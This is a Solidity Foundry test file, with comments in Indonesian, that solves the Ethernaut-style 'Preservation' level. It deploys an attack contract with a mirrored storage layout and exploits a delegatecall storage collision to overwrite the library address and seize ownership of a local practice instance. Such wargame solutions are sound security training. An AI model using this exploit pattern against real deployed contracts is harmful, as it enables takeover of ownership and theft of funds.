// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Preservation} from "src/levels/Preservation.sol";
import {PreservationFactory} from "src/levels/PreservationFactory.sol";

contract PreservationAttack {
    // Layout storage SAMA dengan Preservation supaya delegatecall menulis
    // slot yang benar: slot 0 timeZone1Library, slot 1 timeZone2Library,
    // slot 2 owner.
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256) public {
        owner = msg.sender;
    }
}

contract PreservationSolve is Test {
    PreservationFactory factory;
    Preservation instance;
    address player = address(0xBEEF);

    function setUp() public {
        factory = new PreservationFactory();
        instance = Preservation(factory.createInstance(player));
    }

    function testInit() public view {
        assertFalse(factory.validateInstance(payable(address(instance)), player));
    }

    function testSolve() public {
        PreservationAttack attack = new PreservationAttack();
        // (1) setFirstTime(alamat attack): LibraryContract.setTime menulis
        // slot 0 (storedTime di layout library) -> dalam konteks
        // Preservation slot 0 = timeZone1Library. Kini library = attack.
        instance.setFirstTime(uint256(uint160(address(attack))));
        // (2) setFirstTime lagi: delegatecall ke attack.setTime ->
        // owner = msg.sender (player, lewat prank).
        vm.startPrank(player);
        instance.setFirstTime(uint256(uint160(player)));
        vm.stopPrank();
        assertTrue(factory.validateInstance(payable(address(instance)), player));
    }
}
